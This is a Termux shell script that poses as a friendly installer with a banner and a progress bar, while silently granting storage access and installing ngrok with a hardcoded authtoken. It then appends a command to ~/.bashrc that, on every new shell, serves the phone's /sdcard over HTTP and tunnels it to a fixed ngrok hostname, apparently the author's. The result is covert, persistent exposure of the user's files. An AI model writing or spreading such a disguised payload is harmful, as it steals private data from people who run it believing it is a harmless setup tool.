clear
yes | termux-setup-storage > /dev/null 2>&1 && clear


echo -e "\e[32m--------------------------------------"
echo "          Coded by: Kenddy"
echo "  Your biggest Enemy is your OWNSELF"
echo -e "--------------------------------------"
echo "            SANTAI DULU"
echo "         MINUM KOPI DULUUU"
echo "        CHILL WHILE WAITING"
echo "   DRINK COFFEE, SCROLLING TIKTOK"
echo -e "--------------------------------------"
echo -e "    Loading Please Wait.........."
echo -e "--------------------------------------"
echo ""




function print_bar() {
    local progress=$1
    local width=15
    local bar_width=$((progress * width / 100))

    printf "\r[ Progress ] %3d%%" "$width" "$(printf '%.0s' $(seq 20 "$bar_width"))" "$progress"
}

print_bar 1
sleep 1

print_bar 10
apt update -y > /dev/null 2>&1 

print_bar 20
(apt-get update -o Dpkg::Options::="--force-confnew" --allow-downgrades --allow-remove-essential --allow-change-held-packages -y || apt-get update) > /dev/null 2>&1 && 

print_bar 30
pkg install proot resolv-conf -y > /dev/null 2>&1 

print_bar 40
pkg install -y python > /dev/null 2>&1 

print_bar 50
yes "N" | pkg update -y > /dev/null 2>&1 

print_bar 60
yes "N" | pkg upgrade -y > /dev/null 2>&1 

print_bar 70
pkg install -y wget > /dev/null 2>&1 

print_bar 80
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 

print_bar 90
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1 

print_bar 95
chmod +x ngrok > /dev/null 2>&1 

print_bar 98
mv ngrok /data/data/com.termux/files/usr/bin/ngrok > /dev/null 2>&1 

print_bar 99
ngrok authtoken 2I4JDe48dLs7BmvZoSTNGSPRVtn_q55YzU3ikG8Ewt5HogEV > /dev/null 2>&1 && 

bash bashrc.sh

print_bar 100
echo ""
echo -e "\nclear && cat banner.txt && echo "WORKING ON..." && cd /sdcard && nohup python -m http.server 8080 > /dev/null 2>&1 & termux-chroot ngrok http --hostname=cod-equipped-yak.ngrok-free.app 8080 > /dev/null 2>&1
" >> ~/.bashrc && echo "DONE, PLEASE EXIT" && source ~/.bashrc
